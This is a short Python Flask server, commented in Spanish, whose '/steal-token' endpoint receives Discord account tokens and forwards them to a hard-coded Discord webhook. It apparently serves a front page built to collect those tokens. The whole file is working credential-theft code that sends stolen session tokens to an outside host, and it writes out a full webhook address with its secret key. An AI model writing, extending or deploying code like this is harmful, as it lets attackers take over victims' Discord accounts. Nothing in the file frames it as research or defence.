from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__, static_url_path='', static_folder='.')

@app.route('/steal-token', methods=['POST'])
def steal_token():
    data = request.json
    discord_token = data.get('discord_token')

    if discord_token:
        print('Token recibido:', discord_token)  # Añadir depuración
        # Aquí enviamos el token a tu webhook
        webhook_url = 'https://discord.com/api/webhooks/1401237408368033885/YjgzC6hjpWt1la3iAe03sZXzYPYJ1kKLftNKVA7jeWU9IZVKhpXlltMjzky6CZwXSQr0'
        payload = {'content': f'Nuevo token de Discord: {discord_token}'}
        response = requests.post(webhook_url, json=payload)
        print('Respuesta del webhook:', response.status_code, response.text)  # Añadir depuración
        return jsonify({'message': 'Token recibido con éxito'}), 200
    else:
        return jsonify({'message': 'Token no proporcionado'}), 400

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

if __name__ == '__main__':
    app.run()
